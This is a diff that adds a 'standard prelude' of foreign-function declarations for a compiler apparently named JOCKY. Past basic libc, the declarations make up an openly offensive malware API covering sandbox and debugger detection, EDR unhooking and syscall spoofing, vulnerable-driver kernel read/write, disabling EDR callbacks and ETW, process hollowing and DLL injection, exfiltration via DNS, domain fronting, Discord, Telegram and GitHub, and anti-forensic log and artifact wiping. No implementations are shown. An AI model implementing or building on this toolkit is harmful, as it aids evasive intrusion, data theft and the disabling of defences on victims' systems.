@@ -1,0 +1,73 @@
+// JOCKY standard prelude — auto-injected before every compilation.
+// Use --no-prelude to opt out.
+// All runtime functions declared here are resolved by the linker (no codegen body).
+
+// ---- libc / system ----
+ffi puts(s: string) -> i32;
+ffi printf(fmt: string, ...) -> i32;
+ffi malloc(size: i64) -> i8*;
+ffi free(ptr: i8*) -> void;
+ffi memset(ptr: i8*, val: i32, n: i64) -> i8*;
+ffi memcpy(dst: i8*, src: i8*, n: i64) -> i8*;
+ffi strlen(s: string) -> i64;
+ffi exit(code: i32) -> void;
+
+// ---- Memory allocators ----
+ffi jocky_alloc(size: i64) -> i8*;
+ffi jocky_free(ptr: i8*) -> void;
+ffi jocky_byovd_new() -> i8*;
+ffi jocky_byovd_destroy(ctx: i8*) -> void;
+
+// ---- Anti-analysis ----
+ffi jocky_runtime_init() -> void;
+ffi jocky_check_analysis_environment() -> i32;
+ffi jocky_is_debugger_present() -> bool;
+ffi jocky_is_vm() -> bool;
+ffi jocky_is_sandbox() -> bool;
+ffi jocky_sleep_and_recheck() -> void;
+ffi jocky_decrypt_xor(buf: i8*, size: i32, key: i8, keylen: i32) -> void;
+ffi jocky_decrypt_rc4(buf: i8*, size: i32, key: i8*, keylen: i32) -> void;
+
+// ---- Evasion ----
+ffi jocky_unhook_ntdll() -> bool;
+ffi jocky_get_syscall_number(name: string) -> i32;
+ffi jocky_spoof_call(fn: i8*, a1: i64, a2: i64, a3: i64, a4: i64) -> i64;
+ffi jocky_spoof_syscall(ssn: i32, a1: i64, a2: i64, a3: i64, a4: i64) -> i64;
+
+// ---- BYOVD / driver interaction ----
+ffi jocky_byovd_load(driver_path: string, service_name: string, ctx: i8*) -> bool;
+ffi jocky_byovd_unload(ctx: i8*) -> void;
+ffi jocky_driver_read_phys(ctx: i8*, phys_addr: i64, out: i8*, size: i32) -> bool;
+ffi jocky_driver_write_phys(ctx: i8*, phys_addr: i64, in_: i8*, size: i32) -> bool;
+ffi jocky_driver_map_kernel(ctx: i8*, phys_addr: i64, size: i32) -> i8*;
+
+// ---- Kernel exploit ----
+ffi jocky_kread(ctx: i8*, addr: i64, out: i8*, size: i32) -> bool;
+ffi jocky_kwrite(ctx: i8*, addr: i64, data: i8*, size: i32) -> bool;
+ffi jocky_disable_edr_callbacks(ctx: i8*) -> i32;
+ffi jocky_disable_etw(ctx: i8*) -> bool;
+ffi jocky_elevate_token(ctx: i8*, pid: i32) -> bool;
+
+// ---- In-memory execution ----
+ffi jocky_process_hollow(target: string, payload: i8*, payload_size: i32) -> bool;
+ffi jocky_module_stomp(target_dll: string, payload: i8*, payload_size: i32) -> bool;
+ffi jocky_rdll_inject(pid: i32, payload: i8*, payload_size: i32) -> bool;
+ffi jocky_thread_hijack(pid: i32, payload: i8*, payload_size: i32) -> bool;
+
+// ---- Exfiltration ----
+ffi jocky_exfil_encrypt(data: i8*, size: i32, key: i8*, keylen: i32) -> void;
+ffi jocky_exfil_front(front_domain: string, real_host: string, path: string, data: i8*, size: i32) -> bool;
+ffi jocky_exfil_dns(domain: string, data: i8*, size: i32) -> bool;
+ffi jocky_exfil_discord(webhook: string, data: i8*, size: i32) -> bool;
+ffi jocky_exfil_telegram(token: string, chat_id: string, data: i8*, size: i32) -> bool;
+ffi jocky_exfil_github(token: string, repo: string, data: i8*, size: i32) -> bool;
+
+// ---- Cleanup / anti-forensics ----
+ffi jocky_self_delete() -> void;
+ffi jocky_clear_logs() -> void;
+ffi jocky_wipe_artifacts(dir: string) -> void;
+ffi jocky_wipe_prefetch() -> void;
+ffi jocky_patch_shimcache() -> bool;
+ffi jocky_patch_amcache() -> bool;
+ffi jocky_clear_srum() -> bool;
+ffi jocky_cleanup_all() -> void;
